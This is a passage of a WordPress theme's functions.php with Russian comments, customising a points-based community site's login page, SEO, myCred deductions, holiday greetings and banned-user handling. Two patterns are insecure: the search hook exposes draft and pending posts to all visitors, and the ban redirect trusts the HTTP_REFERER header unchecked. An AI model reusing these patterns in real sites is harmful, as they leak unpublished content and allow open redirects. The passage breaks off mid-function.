        // Сохраняем ID записи в метаполе поста. Теперь они связаны напрямую.
        update_post_meta( $post_id, '_last_gf_entry_id', $entry['id'] );
    }
}
add_action( 'gform_after_submission', 'link_gf_entry_to_post_on_submission', 10, 2 );




// Модифицировать вывод мета-описания Yoast "на лету" https://aistudio.google.com/app/prompts/1zYE0UVAL2la-Btwusasul3YbvgkcWiX3
function customize_yoast_meta_desc($description) {
    // Работаем только на страницах одиночных записей и если описание не задано вручную
    if (is_singular('post') && empty($description)) {
        global $post;
        $content = $post->post_content;

        // Удаляем шорткоды из контента
        $content_no_shortcodes = strip_shortcodes($content);

        // Очищаем от HTML-тегов
        $text = wp_strip_all_tags($content_no_shortcodes);
        
        // Убираем лишние пробелы
        $text = trim(preg_replace('/\s+/', ' ', $text));

        if (strlen($text) > 155) {
            // Обрезаем до 155 символов
            $description = mb_substr($text, 0, 155);
        } else {
            $description = $text;
        }
    }
    return $description;
}
add_filter('wpseo_metadesc', 'customize_yoast_meta_desc', 100, 1);



// анимация на странице  Login vanta.globe.min.js
function woffice_custom_login_scripts() {

    if ( is_page('login') ) {

        // --- Подключение скриптов (не изменилось) ---
        wp_enqueue_script('three-js', 'https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js', array(), null, true);
        $vanta_script_url = get_stylesheet_directory_uri() . '/js/vanta.globe.min.js';
        wp_enqueue_script('vanta-globe-js', $vanta_script_url, array('three-js'), '1.0', true);

        // --- ОБНОВЛЕННЫЙ JAVASCRIPT: СИНХРОНИЗАЦИЯ ПОЯВЛЕНИЯ ---
        $inline_script = "
            document.addEventListener('DOMContentLoaded', function() {
                // Находим контейнер с формой
                const loginContainer = document.getElementById('woffice-login-left');

                // Проверяем, что Vanta.js и контейнер существуют
                if (typeof VANTA !== 'undefined' && typeof VANTA.GLOBE === 'function' && loginContainer) {
                    // 1. Инициализируем Vanta.js
                    VANTA.GLOBE({
                        el: '#page-wrapper',
                        mouseControls: true, touchControls: true, gyroControls: false,
                        minHeight: 200.00, minWidth: 200.00,
                        scale: 1.00, scaleMobile: 1.00,
                        color: 0x82b440, backgroundColor: 0x1d2125,
                        points: 28.00, spacing: 15.00
                    });

                    // 2. ПОСЛЕ инициализации Vanta, добавляем класс 'vanta-ready',
                    // который запустит CSS-анимацию появления формы.
                    loginContainer.classList.add('vanta-ready');
                }
            });
        ";
        wp_add_inline_script('vanta-globe-js', $inline_script);


        // --- ОБНОВЛЕННЫЕ СТИЛИ: ИСПРАВЛЕНИЕ FOUC И СИНХРОНИЗАЦИЯ ---
        $inline_style = "
            /* Запрещаем скролл и задаем полную высоту */
            html, body {
                height: 100%;
                overflow: hidden !important;
            }
            #page-wrapper, #content-container, section#woffice-login {
                height: 100% !important;
            }

            /* ИСПРАВЛЕНИЕ FOUC: Центрируем через родительский элемент */
            section#woffice-login {
                display: flex !important;
                align-items: center !important; /* Вертикальное центрирование */
            }
            #woffice-login-left {
                width: 100% !important; /* Убираем height:100% отсюда! */
                display: flex !important;
                justify-content: flex-start !important;
                padding-left: 15% !important;
            }

            /* Основные стили макета */
            #woffice-login-right { display: none !important; }
            #page-wrapper { background-color: #1d2125 !important; }
            #content-container { background: transparent !important; }
            .form-wrapper { background: #fff !important; }
            .vanta-canvas { z-index: 0 !important; }
            #content-container { position: relative; z-index: 1; }

            /* ИСПРАВЛЕНИЕ СИНХРОНИЗАЦИИ: Анимация запускается по классу от JS */
            @keyframes fadeInContainer {
                from { opacity: 0; transform: translateY(15px); }
                to   { opacity: 1; transform: translateY(0); }
            }
            /* Изначально контейнер с формой полностью скрыт */
            #woffice-login-left {
                opacity: 0;
            }
            /* Когда JS добавит класс .vanta-ready, запускаем анимацию */
            #woffice-login-left.vanta-ready {
                animation: fadeInContainer 0.5s ease-out 0.1s forwards;
            }

            /* Адаптивность для мобильных */
            @media (max-width: 992px) {
                #woffice-login-left {
                    justify-content: center !important;
                    padding-left: 20px !important;
                    padding-right: 20px !important;
                }
            }
        ";
        wp_register_style('custom-login-styles', false);
        wp_enqueue_style('custom-login-styles');
        wp_add_inline_style('custom-login-styles', $inline_style);
    }
}
add_action('wp_enqueue_scripts', 'woffice_custom_login_scripts');



/**
 * =================================================================
 * ССЫЛКИ И ИКОНКИ В АДМИН-БАРЕ
 * =================================================================
 */

// 🔹 Удаляем Woffice, все его подпункты и пункт "Комментарии"
add_action( 'admin_bar_menu', function( $wp_admin_bar ) {

    if ( ! is_admin_bar_showing() ) {
        return;
    }

    // Удаляем Woffice и все дочерние элементы
    $nodes = $wp_admin_bar->get_nodes();
    foreach ( $nodes as $node ) {
        if ( strpos( $node->id, 'woffice' ) === 0 ) {
            $wp_admin_bar->remove_node( $node->id );
        }
    }

    // Удаляем пункт "Комментарии"
    $wp_admin_bar->remove_node( 'comments' );

}, 999 );



// 🔹 Добавляем собственный пункт "Краулер" в админ-бар
function add_crawler_link_to_admin_bar( $wp_admin_bar ) {

    if ( ! is_admin_bar_showing() ) {
        return;
    }

    $args = array(
        'id'    => 'web-crawler-link',
        'title' => '<span class="ab-icon dashicons dashicons-admin-site-alt3"></span><span class="ab-label">Краулер</span>',
        'href'  => admin_url( 'edit.php?post_type=wcc_sites&page=wp-content-crawler-tools' ),
        'meta'  => array(
        'title' => 'для Светички',
                 ),
    );
    $wp_admin_bar->add_node( $args );
}
add_action( 'admin_bar_menu', 'add_crawler_link_to_admin_bar', 999 );

// 🔹 Подключаем стили для иконки только если виден админ-бар
function enqueue_custom_admin_bar_styles() {
    if ( is_admin_bar_showing() ) {
        wp_enqueue_style(
            'custom-admin-bar-icon',
            get_stylesheet_directory_uri() . '/admin-bar-icon.css',
            array(),
            '1.0.4' // Версию можно менять для сброса кэша
        );
    }
}
add_action( 'wp_enqueue_scripts', 'enqueue_custom_admin_bar_styles' );
add_action( 'admin_enqueue_scripts', 'enqueue_custom_admin_bar_styles' );

// добавляет атрибут alt для картинок
function add_alt_from_post_title_to_images($content) {
    if (is_singular()) { // Убедимся, что это одиночная страница или пост
        $post_title = esc_attr(get_the_title());

        // Находим все img без alt-атрибута
        $pattern = '/<img(?!.*\balt=)([^>]*)>/i';
        // Добавляем alt-атрибут с заголовком поста
        $replacement = '<img$1 alt="' . $post_title . '">';

        $content = preg_replace($pattern, $replacement, $content);
    }
    return $content;
}

add_filter('the_content', 'add_alt_from_post_title_to_images');



/**
 * Кастомизация заголовков архивов.
 * - Удаление префиксов (Категория:, Тег:, Год: и т.д.).
 * - Замена заголовка для тега 'starry' на 'Premium Content'.
 */
add_filter( 'get_the_archive_title', function ( $title ) {

    // 1. Проверяем, является ли текущая страница страницей тега с ярлыком 'starry'.
    if ( is_tag('starry') ) {
        // Если да, возвращаем нашу специальную фразу и прекращаем выполнение функции.
        return 'Premium Content';
    }

    // 2. Если это не наш особый тег, применяем общие правила по удалению префиксов.
    if ( is_category() ) {
        $title = single_cat_title( '', false );
    } elseif ( is_tag() ) {
        // Это условие сработает для всех остальных тегов.
        $title = single_tag_title( '', false );
    } elseif ( is_author() ) {
        $title = '<span class="vcard">' . get_the_author() . '</span>';
    } elseif ( is_year() ) {
        $title = get_the_date( _x( 'Y', 'yearly archives date format', 'woffice' ) );
    } elseif ( is_month() ) {
        $title = get_the_date( _x( 'F Y', 'monthly archives date format', 'woffice' ) );
    } elseif ( is_day() ) {
        $title = get_the_date( _x( 'j F, Y', 'daily archives date format', 'woffice' ) );
    } elseif ( is_post_type_archive() ) {
        $title = post_type_archive_title( '', false );
    } elseif ( is_tax() ) {
        $title = single_term_title( '', false );
    }
  
    return $title;
} );

// Отключаем типографскую замену символов (wptexturize)
remove_filter('the_content', 'wptexturize'); // для контента постов
remove_filter('the_title', 'wptexturize');   // для заголовков постов
remove_filter('the_excerpt', 'wptexturize'); // для цитат

//сообщение о холодном сервере
function woffice_old_post_notifier_scripts() {
    if (is_single()) {
        $post_datetime = new DateTime(get_the_date('Y-m-d'));
        $current_datetime = new DateTime('now');
        $interval = $current_datetime->diff($post_datetime);
        $total_months_passed = ($interval->y * 12) + $interval->m;

        if ($total_months_passed >= 24) {
            ?>
            <style>
                #old-post-notification-wrapper {
                    display: grid;
                    grid-template-rows: 0fr;
                    transition: grid-template-rows 0.5s cubic-bezier(0.165, 0.84, 0.44, 1), 
                                margin 0.5s cubic-bezier(0.165, 0.84, 0.44, 1);
                    margin-top: 0;
                    margin-bottom: 0;
                    clear: both;
                    overflow: hidden;
                }
                #old-post-notification-wrapper.show-active {
                    grid-template-rows: 1fr;
                    margin-top: 25px;
                    margin-bottom: 35px;
                }
                #old-post-notification {
                    min-height: 0;
                    display: flex;
                    align-items: flex-start;
                    gap: 20px;
                    background-color: #ffffff;
                    border: 1px solid #e2e8f0;
                    border-left: 4px solid #ffa500;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
                    padding: 20px 24px;
                    border-radius: 12px;
                    font-size: 14px;
                    color: #4a5568;
                    line-height: 1.6;
                    text-align: left;
                    box-sizing: border-box;
                    width: 100%;
                    opacity: 0;
                    transform: translateY(15px);
                    transition: opacity 0.4s ease 0.1s, 
                                transform 0.4s ease 0.1s, 
                                border-color 0.3s ease, 
                                box-shadow 0.3s ease;
                }
                #old-post-notification-wrapper.show-active #old-post-notification {
                    opacity: 1;
                    transform: translateY(0);
                }
                #old-post-notification:hover {
                    transform: translateY(-2px);
                    border-color: rgba(255, 165, 0, 0.3);
                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
                }
                .darkmysite_dark_mode_enabled #old-post-notification {
                    background-color: #1e2125;
                    border-color: #2d3139;
                    border-left-color: #ffa500;
                    color: #cbd5e1;
                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
                }
                .darkmysite_dark_mode_enabled #old-post-notification:hover {
                    border-color: rgba(255, 165, 0, 0.4);
                    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.45);
                }
                .opn-icon-container {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    width: 42px;
                    height: 42px;
                    background-color: rgba(255, 165, 0, 0.1);
                    color: #ffa500;
                    border-radius: 50%;
                    font-size: 18px;
                    flex-shrink: 0;
                    box-shadow: 0 4px 10px rgba(255, 165, 0, 0.15);
                }
                .opn-icon-container i {
                    margin: 0 !important;
                    padding: 0 !important;
                    line-height: 1 !important;
                    display: inline-block;
                }
                .opn-content {
                    flex-grow: 1;
                }
                .opn-title {
                    font-family: "Outfit", "Inter", sans-serif;
                    font-size: 15px;
                    font-weight: 700;
                    color: #1a202c;
                    margin-bottom: 4px;
                    letter-spacing: 0.3px;
                }
                .darkmysite_dark_mode_enabled .opn-title {
                    color: #f1f5f9;
                }
                .opn-description {
                    font-size: 13.5px;
                    color: #4a5568;
                }
                .darkmysite_dark_mode_enabled .opn-description {
                    color: #94a3b8;
                }
                .opn-link {
                    color: #ffa500;
                    font-weight: 600;
                    text-decoration: none;
                    border-bottom: 1px dashed rgba(255, 165, 0, 0.4);
                    transition: all 0.2s ease;
                }
                .opn-link:hover {
                    color: #ff8915;
                    border-bottom-style: solid;
                    border-bottom-color: #ff8915;
                }
            </style>
            
            <script>
            document.addEventListener('DOMContentLoaded', function() {
                const downloadTrigger = document.querySelector('#dl a'); 
                const wrapper = document.getElementById('old-post-notification-wrapper');
 
                if (!downloadTrigger || !wrapper) {
                    return;
                }
 
                let notificationTimer;
                const delay = 250;
                let notificationShown = false;
 
                downloadTrigger.addEventListener('mouseenter', () => {
                    if (notificationShown) {
                        return;
                    }
                    
                    notificationTimer = setTimeout(() => {
                        wrapper.classList.add('show-active');
                        notificationShown = true;
                    }, delay);
                });
 
                downloadTrigger.addEventListener('mouseleave', () => {
                    if (notificationShown) {
                        return;
                    }
                    
                    clearTimeout(notificationTimer);
                });

                // Плавный скролл при клике на ссылку "send a request to unfreeze the file"
                wrapper.addEventListener('click', function(e) {
                    const link = e.target.closest('.opn-link');
                    if (link) {
                        e.preventDefault();
                        const targetElement = document.getElementById('respond');
                        if (targetElement) {
                            const headerOffset = 110; // Отступ под админ-бар и липкую шапку
                            const elementPosition = targetElement.getBoundingClientRect().top;
                            const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
                            
                            window.scrollTo({
                                top: offsetPosition,
                                behavior: 'smooth'
                            });
                        }
                    }
                });
            });
            </script>
            <?php
        }
    }
}
add_action('wp_footer', 'woffice_old_post_notifier_scripts');





/**
 * Добавляет посты со статусами "черновик" и "в ожидании" 
 * в результаты поиска для всех пользователей.
 */
/**
 * 1. Показывает черновики и ожидающие посты в результатах поиска по сайту.
 */
function my_theme_modify_search_query( $query ) {
    if ( ! is_admin() && $query->is_main_query() && $query->is_search() ) {
        $query->set( 'post_status', array( 'publish', 'pending', 'draft' ) );
    }
}
add_action( 'pre_get_posts', 'my_theme_modify_search_query' );
/**
 * 2. Перехватывает пустой результат запроса для одиночных постов
 *    и принудительно ищет черновики/ожидающие посты, чтобы избежать "Nothing Found".
 */
function my_theme_force_find_drafts( $posts, $query ) {
    if ( is_admin() || ! $query->is_main_query() ) {
        return $posts;
    }

    if ( empty($posts) && $query->is_singular() ) {
        $query_vars = $query->query_vars;
        $query_vars['post_status'] = array('pending', 'draft');
        $new_query = new WP_Query($query_vars);
        if ( ! empty($new_query->posts) ) {
            return $new_query->posts;
        }
    }
    return $posts;
}
add_filter( 'the_posts', 'my_theme_force_find_drafts', 10, 2 );
/**
 * 3. Заменяет контент поста на уведомление, если пост не опубликован.
 */
function my_theme_replace_content_with_notice( $content ) {
    // Работаем только на страницах одиночных постов и в основном цикле
    if ( is_singular() && in_the_loop() && is_main_query() ) {
        
        global $post; // Получаем доступ к текущему посту
        $target_statuses = ['draft', 'pending'];

        // Если пост имеет нужный статус и у пользователя НЕТ прав на его редактирование...
        if ( in_array( $post->post_status, $target_statuses ) && ! current_user_can( 'edit_post', $post->ID ) ) {
            
            // Формируем наше новое HTML-уведомление
            $notice_html = '
            <div class="entry-content-notice" style="padding: 30px; border: 2px dashed #ffc107; text-align: center; margin: 20px 0; background-color: #fffaf0;">
                <h2 style="margin-top:0px;">⏳ Content will be available soon</h2><br>
                <p>This post was submitted by a community member and is now going through a moderator review.</p> 
                <p>We’re making sure everything matches the description, is nicely formatted, and contains no harmful files.</p>
                <p>Just a little patience — once the review is complete, the content will be available to everyone.</p>
                <p><strong>👉 Bookmark this page to quickly access it anytime from your profile.</strong></p>
            </div>';
            
            // Отдаем HTTP-статус 200 OK для SEO
            status_header( 200 );

            // Возвращаем наше уведомление ВМЕСТО реального контента поста
            return $notice_html;
        }
    }
      // Во всех остальных случаях возвращаем оригинальный, нетронутый контент
    return $content;
}
add_filter( 'the_content', 'my_theme_replace_content_with_notice', 99 );




/**
 * Скрытие шорткодов в бандлах через Display Posts
 */

// Глобальная переменная для отслеживания контекста
global $dcb_in_bundle_context;
$dcb_in_bundle_context = false;

// Проверка, является ли текущая страница бандлом
function dcb_is_bundle_page() {
    $main_post = get_queried_object();
    
    if (!$main_post || !isset($main_post->ID)) {
        return false;
    }
    
    // Проверяем категорию Bundle
    $is_bundle = has_category('bundle', $main_post);
    
    // ИЛИ проверяем custom field price
    if (!$is_bundle) {
        $price = get_post_meta($main_post->ID, 'price', true);
        $is_bundle = !empty($price);
    }
    
    return $is_bundle;
}

// Устанавливаем контекст перед обработкой Display Posts
function dcb_before_display_posts($atts) {
    global $dcb_in_bundle_context;
    
    if (dcb_is_bundle_page()) {
        $dcb_in_bundle_context = true;
    }
    
    return $atts;
}
add_filter('display_posts_shortcode_args', 'dcb_before_display_posts', 1);

// Сбрасываем контекст после Display Posts
function dcb_after_display_posts($output) {
    global $dcb_in_bundle_context;
    $dcb_in_bundle_context = false;
    return $output;
}
add_filter('display_posts_shortcode_wrapper_close', 'dcb_after_display_posts', 999);

// Удаляем шорткоды из контента
function dcb_filter_content($content) {
    global $dcb_in_bundle_context, $post;
    
    // Удаляем шорткоды только в контексте Display Posts внутри бандла
    if (!$dcb_in_bundle_context) {
        return $content;
    }
    
    // Не трогаем главный пост бандла
    $main_post = get_queried_object();
    if ($main_post && $post && $main_post->ID === $post->ID) {
        return $content;
    }
    
    // Удаляем шорткоды
    $content = preg_replace('/\[gravityform[^\]]*\]/i', '', $content);
    $content = preg_replace('/\[show_page_specific_user[^\]]*\]/i', '', $content);
    $content = preg_replace('/\[UAS_role[^\]]*\].*?\[\/UAS_role\]/is', '', $content);
    $content = preg_replace('/\[mycred_transfer[^\]]*\]/i', '', $content);
    
    // Убираем лишние пустые строки
    $content = preg_replace('/(\r\n|\r|\n){3,}/', "\n\n", $content);
    
    return $content;
}
add_filter('the_content', 'dcb_filter_content', 999);

// Альтернативный метод: фильтр для Display Posts excerpt
function dcb_filter_display_posts_excerpt($excerpt) {
    global $dcb_in_bundle_context;
    
    if (!$dcb_in_bundle_context) {
        return $excerpt;
    }
    
    // Удаляем шорткоды из excerpt
    $excerpt = preg_replace('/\[gravityform[^\]]*\]/i', '', $excerpt);
    $excerpt = preg_replace('/\[show_page_specific_user[^\]]*\]/i', '', $excerpt);
    $excerpt = preg_replace('/\[UAS_role[^\]]*\].*?\[\/UAS_role\]/is', '', $excerpt);
    $excerpt = preg_replace('/\[mycred_transfer[^\]]*\]/i', '', $excerpt);
    
    return $excerpt;
}
add_filter('display_posts_shortcode_excerpt', 'dcb_filter_display_posts_excerpt', 999);

// CSS только для страниц бандлов с таргетингом на Display Posts контейнер
function dcb_bundle_specific_css() {
    if (!dcb_is_bundle_page()) {
        return;
    }
    ?>
    <style>
        /* Скрываем формы только внутри Display Posts на странице бандла */
        .display-posts-listing .gform_wrapper,
        .display-posts-listing .mycred-transfer-form,
        article.listing-item .gform_wrapper,
        article.listing-item .mycred-transfer-form {
            display: none !important;
        }
    </style>
    <?php
}
add_action('wp_head', 'dcb_bundle_specific_css');



//Запрещает создание миниатюр кроме medium
add_filter( 'intermediate_image_sizes_advanced', 'prefix_remove_default_images' );

function prefix_remove_default_images( $sizes ) {
    // Сохраняем только размер 'medium', который вам нужен
    if ( isset( $sizes['medium'] ) ) {
        $medium_size = $sizes['medium'];
        $sizes = array( 'medium' => $medium_size );
    } else {
        // Если по какой-то причине 'medium' не существует, не создаем ничего
        $sizes = array();
    }
    return $sizes;
}

add_filter('acf/settings/remove_wp_meta_box', '__return_false');




/**
 * Добавляет JavaScript в подвал сайта для замены "сломанных" изображений на заглушку.
 */
function add_image_fallback_script_to_footer() {
    // Используем синтаксис Heredoc (<<<JS ... JS;).
    // Важно: знак $ экранирован обратным слэшем (\$), чтобы PHP не принимал его за свою переменную.
    echo <<<JS
<script type="text/javascript" id="image-fallback-script">
document.addEventListener('DOMContentLoaded', function() {
    // Список доменов, для которых нужно проверять изображения
    const targetDomains = [
        'gcdn.daz3d.com',
        'cdn.renderhub.com'
    ];

    // URL вашей картинки-заглушки
    const placeholderUrl = 'http://3d-stuff.community/wp-content/uploads/2025/11/imagedown.png';

    // Собираем селектор для поиска всех нужных изображений.
    // Обратите внимание на \${domain} — слэш нужен для PHP.
    let selectors = targetDomains.map(domain => `img[src*="\${domain}"]`).join(', ');
    
    // Выполняем поиск изображений только если селектор не пустой
    if (selectors) {
        const images = document.querySelectorAll(selectors);

        // Для каждого найденного изображения назначаем обработчик ошибки
        images.forEach(function(img) {
            img.onerror = function() {
                // Проверяем, чтобы не зациклить замену, если заглушка тоже недоступна
                if (this.src !== placeholderUrl) {
                    // Сохраняем оригинальные размеры, если они были заданы
                    const width = this.width;
                    const height = this.height;
                    
                    this.src = placeholderUrl;

                    // Восстанавливаем размеры, чтобы верстка не "прыгала"
                    if (width) this.style.width = width + 'px';
                    if (height) this.style.height = height + 'px';
                    
                    // Убираем srcset, так как он может переопределить src
                    if (this.hasAttribute('srcset')) {
                        this.removeAttribute('srcset');
                    }
                }
            };
        });
    }
});
</script>
JS;
}

add_action('wp_footer', 'add_image_fallback_script_to_footer', 99);

// Не списывать Поинты для постов старше двух лет
add_filter( 'mycred_add', 'abort_mycred_for_old_posts', 10, 3 );

function abort_mycred_for_old_posts( $reply, $request, $mycred ) {
    // 1. Проверяем, что это хук просмотра контента
    // Если ключа 'ref' нет или это не 'view_content', пропускаем (возвращаем $reply как есть)
    if ( ! isset( $request['ref'] ) || $request['ref'] != 'view_content' ) {
        return $reply;
    }

    // 2. Получаем ID поста
    // В $request['ref_id'] лежит ID поста
    $post_id = isset( $request['ref_id'] ) ? $request['ref_id'] : 0;

    if ( ! $post_id ) {
        return $reply;
    }

    // 3. Получаем объект поста для проверки даты
    $post = get_post( $post_id );

    // Если пост не найден, не вмешиваемся
    if ( ! $post ) {
        return $reply;
    }

    // 4. Проверяем возраст поста
    $post_date = strtotime( $post->post_date );
    $two_years_ago = strtotime( '-2 years' );

    // 5. Если пост старше 2 лет
    if ( $post_date < $two_years_ago ) {
        // ВОЗВРАЩАЕМ FALSE
        // Это сигнал для myCred: "Отменить эту транзакцию полностью".
        // Баллы не спишутся и не начислятся, запись в лог не попадет.
        return false;
    }

    // В остальных случаях возвращаем разрешение на транзакцию
    return $reply;
}


// УДАЛИТЬ ВСЕ ПОЗДРАВЛЕНИЯ ПОСЛЕ ОДНОГО ОБНОВЛЕНИЯ СТРАНИЦЫ
// update_post_meta(1056530, '_holiday_greetings', []);

/** 
 * ОБРАБОТЧИКИ ДЛЯ ПРАЗДНИЧНОЙ СТРАНИЦЫ 
 */
// 1. ОТПРАВКА (Только для залогиненных + защита от спама)
add_action('wp_ajax_submit_holiday_greeting', 'handle_holiday_greeting');

function handle_holiday_greeting() {
    check_ajax_referer('festive_nonce', 'security');

    if (!is_user_logged_in()) {
        wp_send_json_error('Login required');
    }

    $name = sanitize_text_field($_POST['sender_name']);
    $message = sanitize_textarea_field($_POST['sender_message']);
    $page_id = intval($_POST['page_id']);

    $greetings = get_post_meta($page_id, '_holiday_greetings', true);
    if (!is_array($greetings)) $greetings = [];

    $new_entry = [
        'id'        => uniqid('greet_'), 
        'user_id'   => get_current_user_id(), // ВАЖНО: сохраняем ID пользователя
        'name'      => $name,
        'message'   => $message,
        'date'      => current_time('mysql'),
        'avatar'    => get_avatar_url(get_current_user_id())
    ];

    array_unshift($greetings, $new_entry);
    update_post_meta($page_id, '_holiday_greetings', $greetings);

    wp_send_json_success($new_entry);
}

// 2. УДАЛЕНИЕ (Полностью исправленная логика)
add_action('wp_ajax_delete_holiday_greeting', 'handle_delete_greeting');

function handle_delete_greeting() {
    // Проверка прав администратора
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized - Admin access required');
    }

    // Проверка nonce для безопасности
    check_ajax_referer('festive_nonce', 'security');

    // Получение данных
    $page_id = intval($_POST['page_id']);
    $greet_id = sanitize_text_field($_POST['greet_id']);

    if (empty($greet_id) || empty($page_id)) {
        wp_send_json_error('Missing required parameters');
    }

    // Получение массива поздравлений
    $greetings = get_post_meta($page_id, '_holiday_greetings', true);
    
    if (!is_array($greetings)) {
        wp_send_json_error('No greetings found');
    }

    $found = false;
    $filtered_greetings = [];

    // Фильтруем массив, исключая элемент с нужным ID
    foreach ($greetings as $greeting) {
        if (isset($greeting['id']) && $greeting['id'] === $greet_id) {
            $found = true;
            // Пропускаем этот элемент (не добавляем в новый массив)
            continue;
        }
        $filtered_greetings[] = $greeting;
    }

    if (!$found) {
        wp_send_json_error('Greeting not found with ID: ' . $greet_id);
    }

    // Обновляем meta с отфильтрованным массивом
    update_post_meta($page_id, '_holiday_greetings', $filtered_greetings);

    wp_send_json_success([
        'message' => 'Greeting deleted successfully',
        'deleted_id' => $greet_id,
        'remaining_count' => count($filtered_greetings)
    ]);
}


/**
 * Активация купона myCred через AJAX
 */
add_action('wp_ajax_v10_activate_xmas_coupon', 'v10_handle_xmas_coupon');
function v10_handle_xmas_coupon() {

    check_ajax_referer('festive_nonce', 'security');

    if (!is_user_logged_in()) {
        wp_send_json_error('Login required');
    }

    $user_id    = get_current_user_id();
    $meta_key   = 'xmas_coupon_2025_claimed';
    $point_type = 'diamonds';
    $ref_key    = 'christmas_reward_2025';

    /**
     * 🔒 САМЫЙ ЖЁСТКИЙ СТОП
     * user_meta — атомарный флаг
     */
    if ( get_user_meta($user_id, $meta_key, true) ) {
        wp_send_json_error('Already claimed');
    }

    /**
     * 🧱 Ставим блок СРАЗУ
     * даже если PHP упадёт — повтор не пройдёт
     */
    update_user_meta($user_id, $meta_key, time());

    // 🎁 Начисление myCred
    if ( function_exists('mycred') ) {

        $mycred = mycred($point_type);

        $mycred->add_creds(
            $ref_key,
            $user_id,
            2025,
            'Christmas Community Gift',
            0,
            '',
            $point_type
        );
    }

    wp_send_json_success('Success');
}


/**
 * 💎 v3: СПИСАНИЕ ТОЛЬКО ЗА ПЕРВЫЙ КОММЕНТАРИЙ
 * Переопределяет версию v2.
 * Логика: Если у пользователя > 1 комментария в этом посте, списания не будет.
 */
// 1. Отключаем предыдущую версию
remove_action('comment_post', 'force_deduct_diamonds_for_comment_v2', 10);

// 2. Подключаем новую версию v3
add_action('comment_post', 'force_deduct_diamonds_for_comment_v3', 10, 2);

function force_deduct_diamonds_for_comment_v3($comment_id, $comment_approved) {
    // Базовые проверки
    if ( $comment_approved !== 1 ) return;
    $comment = get_comment($comment_id);
    $user_id = $comment->user_id;
    
    // Если гость или плагин не активен — выходим
    if ( $user_id == 0 || ! function_exists( 'mycred_add' ) ) return;

    $post_id = $comment->comment_post_ID;

    // --- НОВАЯ ПРОВЕРКА: ЭТО ПЕРВЫЙ КОММЕНТАРИЙ? ---
    // Считаем количество комментариев пользователя к этому посту
    $user_comment_count = get_comments(array(
        'user_id' => $user_id,
        'post_id' => $post_id,
        'count'   => true // Вернуть только число
    ));

    // Важно: хук срабатывает ПОСЛЕ того, как текущий комментарий добавлен.
    // Поэтому, если это первый раз, count будет равен 1.
    // Если count > 1, значит пользователь уже писал сюда раньше.
    if ( $user_comment_count > 1 ) {
        return; // Выходим, не списывая алмазы
    }

    // --- ПОДГОТОВКА ДАННЫХ (Как и раньше) ---
    $post_title = get_the_title($post_id);
    $post_link  = get_permalink($post_id);

    $log_entry = sprintf(
        'Recovery request | <a href="%s" target="_blank">%s</a>', 
        $post_link, 
        $post_title
    );

    // --- СПИСАНИЕ ---
    mycred_add(
        'comment_deduction',
        $user_id,
        -5,
        $log_entry,
        $comment_id,
        array('ref_type' => 'comment'),
        'mycred_default'
    );
}







/* ==========================================================================
   Woffice Banned User Logic (Final Version)
   ========================================================================== */

/**
 * 1. БЛОКИРОВКА И ПЕРЕАДРЕСАЦИЯ
 * Ловим ошибку и возвращаем пользователя на ту страницу, откуда он пришел.
 */
function woffice_handle_banned_redirect( $username, $error ) {
    // Коды ошибок: 'account_banned' (наш) и 'ppc_roles_user_banned' (стороннего плагина)
    $banned_codes = array( 'account_banned', 'ppc_roles_user_banned' );

    if ( is_wp_error( $error ) && in_array( $error->get_error_code(), $banned_codes ) ) {
        
        // Определяем страницу, откуда пришел пользователь
        $redirect_to = isset( $_SERVER['HTTP_REFERER'] ) ? $_SERVER['HTTP_REFERER'] : home_url();

        // Если это стандартный wp-login.php, лучше отправить на главную или страницу входа темы
        if ( strpos( $redirect_to, 'wp-login.php' ) !== false ) {
             $redirect_to = home_url(); 
        }

        // Очищаем URL от старых параметров
        $redirect_to = remove_query_arg( array( 'login_error', 'login', 'elementor-preview' ), $redirect_to );

        // Добавляем параметр ?login_error=banned
        $final_url = add_query_arg( 'login_error', 'banned', $redirect_to );
        
        wp_redirect( $final_url );
        exit;
    }
}
add_action( 'wp_login_failed', 'woffice_handle_banned_redirect', 10, 2 );


/**
 * 2. СТРАХОВКА: Проверка роли (на случай отключения стороннего плагина)
 */
function woffice_ensure_banned_role_check( $user, $password ) {
    if ( is_wp_error( $user ) ) { return $user; }

    if ( in_array( 'banned', (array) $user->roles ) ) {
        return new WP_Error( 'account_banned', 'User is banned' );
    }
    return $user;
}
add_filter( 'wp_authenticate_user', 'woffice_ensure_banned_role_check', 20, 2 );


/**
 * 3. ВЫВОД СООБЩЕНИЯ (JS)
 * Отображает выбранный текст, если в URL есть ?login_error=banned
 */
function woffice_display_banned_message_js() {
    if ( isset( $_GET['login_error'] ) && $_GET['login_error'] === 'banned' ) {
        ?>
        <script type="text/javascript">
            document.addEventListener("DOMContentLoaded", function(event) { 
                
                // Ваш финальный текст
                var msgText = `
                    <div style="text-align: left; line-height: 1.5;">
                        <h4 style="color: #a94442; margin-top: 0; margin-bottom: 15px; font-weight: bold; font-size: 16px; text-transform: uppercase;">
                            <i class="fa fa-ban"></i> ACCOUNT PERMANENTLY BANNED
                        </h4>
                        
                        <p style="margin-bottom: 12px; font-size: 14px; color: #a94442;">
                            <strong>Reason:</strong> This account violated the community’s non-harm policy. Actions linked to this profile directly compromised the anonymity and safety of other members.
                        </p>
                        
                        <p style="margin-bottom: 0; font-size: 14px; color: #a94442;">
                            <strong>Resolution:</strong> We ban accounts, not people. If you wish to be part of this community, please register a new account and strictly follow our safety guidelines.
                        </p>
                    </div>
                `;
                
                // Создаем блок сообщения
                var msgDiv = document.createElement('div');
                msgDiv.className = 'alert alert-danger woffice-banned-alert';
                // Стили оформления
                msgDiv.style.background = '#f2dede'; 
                msgDiv.style.color = '#a94442';
                msgDiv.style.border = '1px solid #ebccd1';
                msgDiv.style.borderLeft = '5px solid #a94442'; // Красный акцент слева
                msgDiv.style.padding = '20px';
                msgDiv.style.marginBottom = '25px';
                msgDiv.style.borderRadius = '4px';
                
                msgDiv.innerHTML = msgText;

                // 1. Скрываем стандартные ошибки
                var existingError = document.querySelector('.alert-danger, .login-errors');
                if (existingError) {
                    existingError.style.display = 'none';
                }

                // 2. Вставляем сообщение над формой
                var container = document.querySelector('.form-wrapper header');
                if (!container) {
                    container = document.querySelector('.form-wrapper');
                }
                
                if (container) {
                    if (container.firstChild) {
